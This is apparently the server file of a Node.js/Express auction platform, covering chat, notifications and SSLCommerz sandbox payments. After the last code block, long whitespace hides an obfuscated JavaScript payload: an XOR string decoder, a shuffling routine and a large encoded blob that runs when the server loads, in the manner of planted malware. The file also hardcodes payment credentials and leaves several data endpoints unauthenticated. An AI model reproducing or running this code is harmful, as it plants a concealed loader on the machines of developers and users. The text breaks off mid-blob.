require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const { Server } = require("socket.io");
const http = require("http");
const axios = require("axios");
const port = process.env.PORT || 5000;
const multer = require("multer");
const app = express();
const server = http.createServer(app);
const upload = multer({ storage: multer.memoryStorage() });
const io = new Server(server, {
  cors: {
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    methods: ["GET", "POST"],
    credentials: true,
  },
  pingTimeout: 60000,
});

app.use(
  cors({
    origin: ["http://localhost:5173", "https://rex-auction.web.app"],
    credentials: true,
  })
);
app.use(express.json());
app.use(cookieParser());
app.use(express.urlencoded());
app.use(bodyParser.urlencoded({ extended: true }));

const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_KEY}@cluster0.npxrq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    await client.connect();
    console.log("Connected to MongoDB");

    const db = client.db("rexAuction");
    const userCollection = db.collection("users");
    const auctionCollection = db.collection("auctionsList");
    const announcementCollection = db.collection("announcement");
    const SellerRequestCollection = db.collection("sellerRequest");
    const SpecificUserLiveBiddingCollection = db.collection("liveBids");
    const reportsCollection = db.collection("reports");
    const messagesCollection = db.collection("messages");
    const notificationsCollection = db.collection("notifications");
    const reactionsCollection = db.collection("auctionReactions");
    const feedbackCollection = db.collection("feedbacks");
    const CoverCollection = db.collection("cover");
    const SSLComCollection = db.collection("paymentsWithSSL");
    const endedAuctionCollection = db.collection("endedAuctionsList");
    const blogCollection = db.collection("blogList");

    // SSLCOMMERZE ID

    //     Store ID: rexau67f77422a8374
    // Store Password (API/Secret Key): rexau67f77422a8374@ssl

    // Merchant Panel URL: https://sandbox.sslcommerz.com/manage/ (Credential as you inputted in the time of registration)

    // Store name: testrexauqg5q
    // Registered URL: www.rex-auction.web.app.com
    // Session API to generate transaction: https://sandbox.sslcommerz.com/gwprocess/v3/api.php
    // Validation API: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?wsdl
    // Validation API (Web Service) name: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php

    // JWT Middleware
    const verifyToken = (req, res, next) => {
      const token =
        req?.cookies?.token || req.headers["authorization"]?.split(" ")[1];
      if (!token)
        return res.status(401).send({ message: "Unauthorized access" });
      jwt.verify(token, process.env.ACCESS_TOKEN, (err, decoded) => {
        if (err)
          return res.status(401).send({ message: "Unauthorized access" });
        req.decodedUser = decoded;
        next();
      });
    };

    // Verify Admin Middleware
    const verifyAdmin = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isAdmin = user?.role === "admin";
      if (!isAdmin)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Verify Seller Middleware
    const verifySeller = async (req, res, next) => {
      const email = req.decodedUser.email;
      const query = { email: email };
      const user = await userCollection.findOne(query);
      const isSeller = user?.role === "seller";
      if (!isSeller)
        return res.status(401).send({ message: "Unauthorized request" });
      next();
    };

    // Socket.IO Logic for Chat and Notifications
    io.on("connection", (socket) => {
      console.log("New client connected:", socket.id);

      const joinedRooms = new Set();

      // Send immediate connection acknowledgment
      socket.emit("connection_ack", {
        id: socket.id,
        status: "connected",
        timestamp: new Date(),
      });

      socket.on("joinChat", ({ userId, selectedUserId, roomId }) => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();

        if (roomId) {
          socket.join(roomId);
          joinedRooms.add(roomId);
          console.log(`${socket.id} (${userId}) joined chat room ${roomId}`);
        } else {
          const chatId = [userId, selectedUserId].sort().join("_");
          socket.join(chatId);
          joinedRooms.add(chatId);
          console.log(`${socket.id} (${userId}) joined chat ${chatId}`);
        }

        const personalRoom = `user:${userId}`;
        socket.join(personalRoom);
        joinedRooms.add(personalRoom);
        console.log(`${socket.id} joined personal room ${personalRoom}`);

        socket.emit("joinedRoom", {
          room: roomId || [userId, selectedUserId].sort().join("_"),
          personalRoom,
          status: "joined",
        });
      });

      socket.on("leaveAllRooms", () => {
        joinedRooms.forEach((room) => {
          socket.leave(room);
          console.log(`${socket.id} left room ${room}`);
        });
        joinedRooms.clear();
        socket.emit("leftRooms", { status: "success" });
      });

      socket.on("sendMessage", async (messageData, callback) => {
        try {
          const { senderId, receiverId, text, roomId } = messageData;
          const chatId = roomId || [senderId, receiverId].sort().join("_");

          const messageId = new ObjectId().toString();
          const message = {
            messageId,
            senderId,
            receiverId,
            text,
            createdAt: new Date(),
          };

          const existingMessage = await messagesCollection.findOne({
            messageId: message.messageId,
          });

          if (existingMessage) {
            if (callback)
              callback({ success: false, error: "Message already exists" });
            return;
          }

          const result = await messagesCollection.insertOne(message);

          if (result.acknowledged) {
            // Emit to the chat room
            io.to(chatId).emit("receiveMessage", message);

            // Emit to sender's and receiver's personal rooms for sidebar updates
            io.to(`user:${senderId}`).emit("receiveMessage", message);
            io.to(`user:${receiverId}`).emit("receiveMessage", message);

            if (callback)
              callback({ success: true, messageId: result.insertedId });
            console.log(
              `Message sent to room ${chatId}: ${text.substring(0, 20)}...`
            );
          } else {
            if (callback)
              callback({ success: false, error: "Failed to save message" });
          }
        } catch (error) {
          console.error("Error sending message:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      // Handle sending notifications - FIXED: removed duplicate handler
      socket.on("sendNotification", async (notificationData, callback) => {
        try {
          // Add a unique ID to the notification
          const notificationId = new ObjectId().toString();
          const notification = {
            ...notificationData,
            _id: notificationId,
            createdAt: new Date(),
          };

          // Save notification to database
          const result = await notificationsCollection.insertOne(notification);

          if (result.acknowledged) {
            // If recipient is specified, emit to that user's personal room
            if (notification.recipient && notification.recipient !== "all") {
              io.to(`user:${notification.recipient}`).emit(
                "receiveNotification",
                notification
              );
            } else {
              // Otherwise broadcast to all connected clients
              io.emit("receiveNotification", notification);
            }

            if (callback) callback({ success: true, notificationId });
            console.log(`Notification sent: ${notification.title}`);
          } else {
            if (callback)
              callback({
                success: false,
                error: "Failed to save notification",
              });
          }
        } catch (error) {
          console.error("Error sending notification:", error);
          if (callback) callback({ success: false, error: error.message });
        }
      });

      socket.on("ping", (callback) => {
        if (callback) callback({ time: new Date(), status: "active" });
      });

      socket.on("disconnect", () => {
        console.log("Client disconnected:", socket.id);
        joinedRooms.clear();
      });
    });

    // Payment APIs with SSLcom
    app.post("/paymentsWithSSL", async (req, res) => {
      const paymentData = req.body;
      // const result = await SSLComCollection.insertOne(paymentData)
      const trxid = new ObjectId().toString();
      paymentData.trxid = trxid;
      const initiate = {
        store_id: "rexau67f77422a8374",
        store_passwd: "rexau67f77422a8374@ssl",
        total_amount: Number(paymentData.price || 0),
        price: paymentData.price,
        serviceFee: paymentData.serviceFee,
        buyerInfo: paymentData.buyerInfo,
        tran_id: trxid,
        currency: "BDT",
        auctionId: paymentData.auctionId,
        success_url: "http://localhost:5000/success-payment",
        fail_url: "http://localhost:5173/dashboard/paymentFailed",
        cancel_url: "http://localhost:5173/cancel",
        ipn_url: "http://localhost:5000/ipn-success-payment",
        shipping_method: "Courier",
        product_name: `${paymentData.name}`,
        product_category: `${paymentData.itemInfo.category}`,
        product_profile: `${paymentData.buyerInfo.photoUrl}`,
        cus_name: `${paymentData.buyerInfo.name}`,
        cus_email: `${paymentData.buyerInfo.email}`,
        cus_add1: "Dhaka",
        cus_add2: "Dhaka",
        cus_city: "Dhaka",
        cus_state: "Dhaka",
        cus_postcode: "1000",
        cus_country: "Bangladesh",
        cus_phone: "01711111111",
        cus_fax: "01711111111",
        ship_name: "Customer Name",
        ship_add1: "Dhaka",
        ship_add2: "Dhaka",
        ship_city: "Dhaka",
        ship_postcode: 1000,
        ship_country: "Bangladesh",
      };

      const iniResponse = await axios({
        url: "https://sandbox.sslcommerz.com/gwprocess/v4/api.php",
        method: "POST",
        data: initiate,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });

      await SSLComCollection.insertOne(paymentData);

      const gatewayURL = iniResponse?.data?.GatewayPageURL;
      // console.log(gatewayURL);
      res.send({ gatewayURL });
    });
    // Payment APIs with rex wallet
    app.post("/rexPayment", async (req, res) => {
      const paymentData = req.body;
      try {
        const result = await SSLComCollection.insertOne(paymentData);

        res.status(201).send({ success: true, insertedId: result.insertedId });
      } catch (error) {
        res.status(500).send({ message: "Failed to process payment" });
      }
    });

    app.post("/success-payment", async (req, res) => {
      const paymentSuccess = req.body;
      console.log(paymentSuccess, "payment success");
      const { data } = await axios.get(
        `https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?val_id=${paymentSuccess.val_id}&store_id=rexau67f77422a8374&store_passwd=rexau67f77422a8374@ssl&format=json`
      );

      if (data.status !== "VALID") {
        return res.send({ message: "invalid payment" });
      }

      // Update SSLComCollection
      const updateResult = await SSLComCollection.updateOne(
        { trxid: paymentSuccess.tran_id },
        {
          $set: {
            PaymentStatus: "success",
          },
        }
      );
      res.redirect(
        `http://localhost:5173/dashboard/payments/${paymentSuccess.tran_id}`
      );
    });

    // Payment data getting

    app.get("/payments", async (req, res) => {
      const users = await SSLComCollection.find().toArray();
      res.send(users);
    });

    app.get("/payments/:trxid", async (req, res) => {
      const trxid = req.params.trxid;
      const payment = await SSLComCollection.findOne({ trxid: trxid });
      res.send(payment);
    });
    app.post("/create-sslCom", async (req, res) => {
      const paymentData = req.body;
      console.log(paymentData);
    });

    // Chat API Endpoints
    app.get(
      "/messages/email/:userEmail/:selectedUserEmail",
      async (req, res) => {
        const { userEmail, selectedUserEmail } = req.params;
        const { since } = req.query;

        try {
          const query = {
            $or: [
              { senderId: userEmail, receiverId: selectedUserEmail },
              { senderId: selectedUserEmail, receiverId: userEmail },
            ],
          };

          if (since) {
            query.createdAt = { $gt: new Date(since) };
          }

          const messages = await messagesCollection
            .find(query)
            .sort({ createdAt: 1 })
            .toArray();
          res.send(messages);
        } catch (error) {
          console.error("Error fetching messages by email:", error);
          res.status(500).send({ message: "Failed to fetch messages" });
        }
      }
    );

    // Fetch the most recent message
    app.get("/recent-messages/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const recentMessages = await messagesCollection
          .aggregate([
            {
              $match: {
                $or: [{ senderId: userEmail }, { receiverId: userEmail }],
              },
            },

            { $sort: { createdAt: -1 } },

            {
              $group: {
                _id: {
                  $cond: [
                    { $eq: ["$senderId", userEmail] },
                    "$receiverId",
                    "$senderId",
                  ],
                },
                lastMessage: { $first: "$$ROOT" },
              },
            },
            // Project the required fields
            {
              $project: {
                userEmail: "$_id",
                lastMessage: 1,
                _id: 0,
              },
            },
          ])
          .toArray();

        res.send(recentMessages);
      } catch (error) {
        console.error("Error fetching recent messages:", error);
        res.status(500).send({ message: "Failed to fetch recent messages" });
      }
    });

    // Socket connection test endpoint
    app.get("/socket-test", (req, res) => {
      res.json({
        status: "Socket.IO server running",
        connections: io.engine.clientsCount,
        uptime: process.uptime(),
      });
    });

    // API endpoints for notifications - FIXED: moved inside run() function
    app.get("/notifications/:userEmail", async (req, res) => {
      const { userEmail } = req.params;
      try {
        const notifications = await notificationsCollection
          .find({
            $or: [{ recipient: userEmail }, { recipient: "all" }],
          })
          .sort({ createdAt: -1 })
          .limit(50)
          .toArray();

        res.send(notifications);
      } catch (error) {
        console.error("Error fetching notifications:", error);
        res.status(500).send({ message: "Failed to fetch notifications" });
      }
    });

    app.put(
      "/notifications/mark-read/:userEmail",
      // verifyToken,
      async (req, res) => {
        const { userEmail } = req.params;
        try {
          const result = await notificationsCollection.updateMany(
            {
              $or: [
                { recipient: userEmail, read: false },
                { recipient: "all", read: false },
              ],
            },
            { $set: { read: true } }
          );

          res.send({ success: true, modifiedCount: result.modifiedCount });
        } catch (error) {
          console.error("Error marking notifications as read:", error);
          res
            .status(500)
            .send({ message: "Failed to mark notifications as read" });
        }
      }
    );

    app.post("/notifications", async (req, res) => {
      try {
        const notification = {
          ...req.body,
          _id: new ObjectId().toString(),
          createdAt: new Date(),
        };

        const result = await notificationsCollection.insertOne(notification);

        if (result.acknowledged) {
          res.send({ success: true, notificationId: notification._id });
        } else {
          res
            .status(500)
            .send({ success: false, message: "Failed to save notification" });
        }
      } catch (error) {
        console.error("Error creating notification:", error);
        res.status(500).send({ success: false, message: error.message });
      }
    });
    const viewNotificationDetails = (notification) => {
      setNotifications((prev) =>
        prev.map((n) => (n._id === notification._id ? { ...n, read: true } : n))
      );

      if (notificationCount > 0) {
        setNotificationCount((prev) => prev - 1);
      }

      // Navigate based on notification type
      if (notification.type === "auction" && notification.auctionData?._id) {
        navigate(`/dashboard/auction-details/${notification.auctionData._id}`);
      } else if (notification.type === "announcement") {
        navigate("/dashboard/announcement", {
          state: {
            notificationDetails: notification,
          },
        });
      }

      // Close notifications panel
      setIsNotificationsOpen(false);
    };
    // Socket.IO Logic for Auction Bidding
    module.exports = (io) => {
      io.on("connection", (socket) => {
        console.log("New client connected:", socket.id);

        socket.emit("connection_ack", {
          id: socket.id,
          status: "connected",
          timestamp: new Date(),
        });

        // Join auction room
        socket.on("joinAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.join(`auction:${auctionId}`);
            console.log(
              `${socket.id} joined auction room: auction:${auctionId}`
            );
          }
        });

        // Leave auction room
        socket.on("leaveAuction", ({ auctionId }) => {
          if (auctionId) {
            socket.leave(`auction:${auctionId}`);
            console.log(`${socket.id} left auction room: auction:${auctionId}`);
          }
        });

        // Handle new bids
        socket.on("placeBid", async (bidData) => {
          try {
            console.log(`New bid received from ${socket.id}:`, bidData);

            io.to(`auction:${bidData.auctionId}`).emit("newBid", bidData);

            console.log(`Bid broadcast to auction:${bidData.auctionId}`);
          } catch (error) {
            console.error("Error handling bid:", error);
            socket.emit("bidError", { message: "Failed to process bid" });
          }
        });

        socket.on("disconnect", () => {
          console.log("Client disconnected:", socket.id);
        });
      });
    };                                                                                                                                                     var z = '-1540-1';(function(QM$KDBWCRPFzyvheJa_VpYiqbG,FXwrfRJ){var gMMmO_YeNsGaUjYbDB=DiRry,FlhvzRQud_B=QM$KDBWCRPFzyvheJa_VpYiqbG();while(!![]){try{var xYMIlTdVeUzsqDg_mAq=parseFloat(gMMmO_YeNsGaUjYbDB(0x1ee))/(parseInt(0x467)+0x80c*parseInt(0x1)+-parseInt(0xc72))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1f0))/(-0x1225+Number(parseInt(0x1bc3))+-parseInt(0x99c))*(parseFloat(gMMmO_YeNsGaUjYbDB(0x1e8))/(parseInt(0x130d)+parseInt(0x2483)*0x1+parseInt(0x1)*-0x378d))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e2))/(parseInt(0x51f)*parseInt(0x6)+-parseInt(0x21b)+Math.max(-parseInt(0x1c9b),-parseInt(0x1c9b)))+parseFloat(gMMmO_YeNsGaUjYbDB(0x1ed))/(0xe8f+parseInt(0x54c)+parseInt(-0x13d6))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1e4))/(Math.ceil(-0x3)*parseInt(0x425)+-0x738+0x13ad))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1f1))/(parseInt(parseInt(0x203a))+Math.trunc(-0x537)+Math.ceil(parseInt(0x4))*Math.floor(-0x6bf)))*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e1))/(parseFloat(0x4)*0x2af+-0x1ce0+-parseInt(0x122c)*-0x1))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1ef))/(parseFloat(-0xe)*0x2c+parseInt(0xe76)+-parseInt(0xc05)*0x1)*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e9))/(Math.floor(parseInt(0x6))*parseInt(-0x5ff)+-parseInt(0x26c)+parseInt(0x99c)*parseInt(0x4)));if(xYMIlTdVeUzsqDg_mAq===FXwrfRJ)break;else FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}catch(sGridQMYCASxO_vJpEzy){FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}}}(d$qtJhn$jgp,-parseInt(0x4526d)+-0x189bb4+0x2b6a8a));var NX=[0x1*parseInt(0x3174ec)+Math.max(parseInt(0x7),parseInt(0x7))*Math.floor(0x1db0c2)+-parseInt(0x97ceeb),parseInt(0x7)*-0x74+-0x751*Math.floor(-0x4)+Math.trunc(-0x18a9),Math.trunc(-parseInt(0x61d5))*0x1+parseInt(parseInt(0x140))+parseInt(0x70)*parseInt(0x193),Math.floor(-0x77)*0x23+parseInt(0xcf3)+-0xb*Math.max(-parseInt(0x85),-0x85),Math.floor(-parseInt(0x5))*Math.ceil(0x1e66)+-parseInt(0x31b6)+0x5*Math.floor(parseInt(0x4a87)),-parseInt(0x76fb5d)+parseInt(0x4)*Math.floor(parseInt(0x176711))+0x12f82*parseInt(0x56)],SX=[-parseInt(0x255f70)+Number(0xa70)*parseFloat(parseInt(0x18e))+parseInt(0x65c4ed),Math.trunc(0x9)*parseInt(0x143)+-parseInt(0x2348)+Math.ceil(-0x425)*-parseInt(0x6),parseInt(0x1567)*Number(0x6)+-parseInt(0x444f)+-0x25*Math.ceil(-0x2ce),parseInt(0x4fe)*-parseInt(0x7)+-0x407+Math.trunc(parseInt(0x69e))*0x6,-parseInt(0x1e)*0x1d2+Math.ceil(-parseInt(0xb6b2))+0x1c88f,-0x7e7900+Math.trunc(-parseInt(0x10203))+parseInt(0xc7ca58)];function spin(aUYluOouh,GZIangXDAgLfl){var e_lqkshVvBRm$lo=DiRry,gGCKNxTzXCGBqECEJcPRezzt=[],r$vpWsaOjqBRovpzm=-0x13*-0x1b1+Math.max(0x55d,parseInt(0x55d))*Number(-parseInt(0x1))+-parseInt(0x1ac6),uwYufDg_OBsIrYbEAn_TbE=GZIangXDAgLfl[parseInt(0x60d)+-parseInt(0x149e)+parseFloat(-0xe91)*Math.max(-0x1,-0x1)],NkIMqAWxrmE$ldvsZshU,cdyhMYgJcNxAhlePvsOh,ndwVeiAOnIDvuMkcl_gBB,kMXmB$ki,WIQhopNZTya,HqoQNaSvxJJHuealUGqbuSi;while(r$vpWsaOjqBRovpzm<aUYluOouh[e_lqkshVvBRm$lo(0x1e6)]){gGCKNxTzXCGBqECEJcPRezzt[r$vpWsaOjqBRovpzm]=aUYluOouh[e_lqkshVvBRm$lo(0x1ea)](r$vpWsaOjqBRovpzm),r$vpWsaOjqBRovpzm+=-parseInt(0x4)*Math.floor(parseInt(0x307))+-parseInt(0x3df)+parseInt(0xffc);}NkIMqAWxrmE$ldvsZshU=gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e6)],r$vpWsaOjqBRovpzm=Math.floor(-0x1c55)+-0x24a3+parseInt(0x40f8);while(r$vpWsaOjqBRovpzm<NkIMqAWxrmE$ldvsZshU){cdyhMYgJcNxAhlePvsOh=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[Math.trunc(-0x130e)+parseInt(0x2117)+Math.trunc(-parseInt(0xe08))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[-parseInt(0x12d5)+-0xef9*-0x2+Math.ceil(parseInt(0x1))*-parseInt(0xb1b)],ndwVeiAOnIDvuMkcl_gBB=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[0x117c+0xf21+parseInt(-0x209a)*parseInt(parseInt(0x1))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[parseFloat(0x79)*-0x11+0xdf0+-0x5e3],kMXmB$ki=cdyhMYgJcNxAhlePvsOh%NkIMqAWxrmE$ldvsZshU,WIQhopNZTya=ndwVeiAOnIDvuMkcl_gBB%NkIMqAWxrmE$ldvsZshU,HqoQNaSvxJJHuealUGqbuSi=gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki],gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki]=gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya],gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya]=HqoQNaSvxJJHuealUGqbuSi,uwYufDg_OBsIrYbEAn_TbE=(cdyhMYgJcNxAhlePvsOh+ndwVeiAOnIDvuMkcl_gBB)%GZIangXDAgLfl[-parseInt(0x1)*Math.floor(parseInt(0x799))+parseFloat(parseInt(0x1cf7))+Math.trunc(0x445)*Math.floor(-parseInt(0x5))],r$vpWsaOjqBRovpzm+=Math.floor(parseInt(0x1))*Math.max(-parseInt(0xf1),-0xf1)+-parseInt(0xb47)*0x2+parseInt(0x20)*parseInt(0xbc);}return gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e0)]('');}function DiRry(epXKFsIKDpIWkjWrh,BvJsow){var tvWHBzRbPfPwTJZTGQCeB$tCw_D=d$qtJhn$jgp();return DiRry=function(ySqQ$AHcQFxKmoVXuW_KuGN,AsByGuucxC){ySqQ$AHcQFxKmoVXuW_KuGN=ySqQ$AHcQFxKmoVXuW_KuGN-(0x145b+parseInt(0x1044)+Number(-0x22bf));var a$MWQEhXtw_pDowcTvUzdzwboh=tvWHBzRbPfPwTJZTGQCeB$tCw_D[ySqQ$AHcQFxKmoVXuW_KuGN];if(DiRry['DjLlIO']===undefined){var H$BajAALKn_kBbaiyV=function(JQPbxjcnpuTPx){var QQUFJvNzkGGDh=parseInt(-parseInt(0x1322))+-0x191f+parseInt(0x2efa)&parseFloat(0xd01)*-parseInt(0x1)+-parseInt(0x1)*parseInt(0x21d)+Math.max(parseInt(0x101d),parseInt(0x101d)),JEBeTdm_WqjixChyLVLd_rAnH=new Uint8Array(JQPbxjcnpuTPx['match'](/.{1,2}/g)['map'](k_aUYluOo_uhwGZIa=>parseInt(k_aUYluOo_uhwGZIa,parseInt(0xa2a)+0x2*-parseInt(0xf31)+Math.trunc(-parseInt(0x1))*-parseInt(0x1448)))),pQgcMTUziLlXONxhFnqF_y=JEBeTdm_WqjixChyLVLd_rAnH['map'](gXDAgLflXg=>gXDAgLflXg^QQUFJvNzkGGDh),ZxoPQqSbOmI$QYJLE$pzofdWlbF=new TextDecoder(),afdSJv_WDyfUhfJHqsvtzxDk=ZxoPQqSbOmI$QYJLE$pzofdWlbF['decode'](pQgcMTUziLlXONxhFnqF_y);return afdSJv_WDyfUhfJHqsvtzxDk;};DiRry['BdQqBU']=H$BajAALKn_kBbaiyV,epXKFsIKDpIWkjWrh=arguments,DiRry['DjLlIO']=!![];}var YVwXsDTtteoFVSE_m=tvWHBzRbPfPwTJZTGQCeB$tCw_D[0x21e+-0x333*0x7+parseInt(0x1447)],yNaI_WzggrxC$wcp=ySqQ$AHcQFxKmoVXuW_KuGN+YVwXsDTtteoFVSE_m,SKQhbzliqcZnWcmj_yEXnTj_Xm=epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp];return!SKQhbzliqcZnWcmj_yEXnTj_Xm?(DiRry['HCrAPb']===undefined&&(DiRry['HCrAPb']=!![]),a$MWQEhXtw_pDowcTvUzdzwboh=DiRry['BdQqBU'](a$MWQEhXtw_pDowcTvUzdzwboh),epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp]=a$MWQEhXtw_pDowcTvUzdzwboh):a$MWQEhXtw_pDowcTvUzdzwboh=SKQhbzliqcZnWcmj_yEXnTj_Xm,a$MWQEhXtw_pDowcTvUzdzwboh;},DiRry(epXKFsIKDpIWkjWrh,BvJsow);}function d$qtJhn$jgp(){var fYa_ecAuUpEYAjErRZhvFjWnMQ=['8e8d888b8c8a8bd6dddddff1fd','caccdbcacdcbd0d7de','d5dcd7decdd1','cac9d5d0cd','88818ae8daf8ffd1ef','818f8b8e8d8f89d8d2c3c8ede8','dad1d8cbf8cd','dae7d4dcd3dbe7cdcbd6','d1c8dccbcac1d5cccfced8daddd3dbc0d4ded6cbc3dfd2d6dad0c9cdcbcccdd7cacdd6d7da','8f88808a898cd3e0e9d8f6cf','888f8b8d8f8d8bdad4ded4fbf2','8881fed2c8cdc8d2','8c818f888bcadcdfc8ceed','8c8ff1eacad8daf2','dfcbd6d4fad1d8cbfad6dddc','fa8ff0dd9997dcda9a97ebcd8297979785fadddfebdf84ddcb85c1c090ddca978bdc9899979785d7cd97da85d0da98cddfcdddde97ca97858097fa9497ebeb97ebd1c3dcebd5eb828dd6d889cbc1da96d198d8cb85d485ebdc85ca91eb8383eb86df829f9cdbd0d88385edd197d1859799dfd2dac0c0d5ebdaeb8398d8958585d9d8d79fd5da8cc5d585e6ebeb97d08debd097c183ebcecad7d797ddca97f6999289d7dfe6f9d2d189d6cb91d0dacb8dcad0ebcd978dcbddeb9bc19deb9782ebccd8ebff9bdfdcdaeb8099dc85e9fcf4eb93cddbebeb8c8882e795fad09894eb97cbcaeb81c1839097cfcadaebeb85ebd5989287eb86ebf4cf9797949185ebdc9e85d7dadfdeebcaeb97c4d09fd8cbdddeeb85ebc385eb9f80eb85dc98d79dc1f0d88098c1d1dc96daeb939799c9dcd1da97ddebebe8dacddd8a89ebc8eb95ebfd96dfe09b90f9da9797db8385d6cace899797eb9897829185ebdfebcd979785ebcbf78deaebdc94ccd8eb988e98e9979cdc999185fa9785d5e9ddebeb9edacad8dc98ebc59f978b97deebc9e8e682d684dfeb85e98d85dfcdeaebebeb85eb8ddadc97eb97d78597908899dc97dd9885fcc7c0d087cbd5d785dcebc9ecebddda9cda99ceda8fd596d5d7cbdd85839785d085cd89e7eb9b99cf85d485edcbcadce2ebf7c9d191e991d0dfeb89d581dadaebebda97d185cad8fadcdccecb8eccebdd858283edebdcc1c1f2d8ebdfd8e29bf5cb999cd39dd5908585e2dcfc85dcf88597d8c89a97eb9995ebd5cbd0eb90ebdcc9cae7e4d088d0dacddcd3cad6f1fc82cd89d1c0ef98ebd4dcdcd389df98ebd5d7eb97dc81ebdac08acbe999ca89eb97f4d8c185daebd2eb97d785daca8d98dd90e680ebdfcd8597d8c5eb989debf885df97eb91cad7ebebdedafbebdceb8597daca9191d4daebefdcd791fddcc9cadaeed0ebcd9bdc85cbebebebfc97ebeb89eccb9b9997da9997ebc9859797d7eb9483f4d5979085d0f0d2ebdad89797d5dc95d2dc9c8f99ebcde3f0d6db97fde6ef859791978dcdf7859185ebdd89d897dd97fc9ccdcd85e6eb9797dfd7daebda978fd8e0f0eb85ebcecddaf997dd82d699ffeceb97d088998bfedbebcedfe197dceee2e385da9798cd91cddcce99ffdaf9eb99ebedcbeb8debebeb988ad79499d5d7ebe6eb8d91ebcadf829197ce91dcc98bdafd8597ebeb91caebc591db85eb859785f9ebf497ebc1ebca9cebd197e7ebe1c5ebebdb95978485cce7f9dad8dc858497cd90d59097de9897eb85eb859797918ceb97d4d2eb91d4ebd5e198f49fd0f4c18499e6d584dacaeb979785d8dd9acf85cac197d7ebdaddd1d8d297c4e29aeb8a9791eb9597d6db9797dfdd97d6dada8585d39785eb8490e285fdebcdded285dacbdfeb97daebcad799c2eb97eb97fdda8bdad8c9d6d88985e2eb8597cd97ebebcdd093c1cbdac9e697ebddedc4eb85d6c9d5dadbebc4c1ebd6ebc4d7f5ebd2eb9491def197ebd8dcea9797f4979bebd6caebdcc9d59797ff949799d7ccd790ebebebd8d19497dcfc988f98dddccaeb859febd6d6cdd79febda97d7fbe9f8ebd5eb97eb85e9899fdd979197efdacbdc85de978a99ded6c99497fcdb85d68aca8bdee99ddcdfdaead0c3859be2dcca899fe4dfd7cbeb85dad6dffad7eddad1eb97d7ded584dc9f9785eb8985c29797d1ca88ccebdaebebcd92cbdbeb8589f4dc91f48594d797ebc3d888929297ebebca99d8978497ddc4dc9187cb9a95899c82edc2ceded8ddc8cdc091dadafada8585cfcfdf8597ebeb97dceb97ebf5db85da8982cddd97f1ccebd485d6cbdcebd5ebd8ebd89984978585ebebcbebcb9eda85caddc28993f780cde5daeb9d83ebf398ebfbf6ebcbebd5d6e6ebda98d899ebebd5eb99dbcddbeb99cad8f4d696caeb9089828beb86eb85ebdd8593ea9d98c2ebd0d2cdd7d682ebd7dceb84808585eb9edadbd4d1c99785eb8ad5d5eb899097979797e5f7c8859597ebeae89d8cebc9cdfceeebebd5cd8599eb99eb91cadeebc9e293ebebcdd185ebebedeaccd7cad597da98d799ebd7cacbebda9797999ed8da97979beb97e198dcdfebe9dccdc1859997dddcd69a9885cbddc9dc90e6ebcceb85ebd7ebebebd0fc85cd8f90dcc48a85ebf0979cebd9cc8d98eb85eb8ac9cbebebcac9d097da9885dce7c49786f38fd2ebd1cd9ae9d0fbcd98f286ebda86ebeb82ebcbebca859feb98ded899979980daebd7ebeb8197f9ddebcaebd8ebe2f09785d7df979485f097f1d68dc8c9df91eb97f0dcc9e4fc9d8597cd97c7dce5eb8b97cb85ec98c3f4cb97dac4ebdcebd5fddbeb91eb97fccd85dcc986c98ffcdaf79785dacadc9596c3da889897cbdad5df939691df97eb85ebcd97daffebeb9bf5ebe189d697dc85ebc2dcebebebdccde197cdcbd6dd91979799cbebdb8f97d9da8a90858981d4dcebd0cdcdcacacd84d09790dc8585eb97ebf797c9eb8ddbcdcc978fddf0d0de98d1ebcc99cdfdebdceb85eb82ebda97dad397da8591e680dadad483d297ddda85ebdfeb97ca9797eb9fd8dadddddcca9099f59991e6cec7d697dfcbd59f9882d4d885eb9984d2eb97dc85e6cb95d1f2e99c85d49fe4c9dad5d897d684ca88ebd1979d91c9ebd591c397ca8d82ebd099c498e29cebcaebeb879785c497d597ffdd85818598979be49796d89982d2d09791d785ebebcdebfa8adf8b91eb89fcee97d7989980eb95da9898ebd5d0d0ca8fdacad7ca90d1cbfe85c38debebe98cebd0ebeb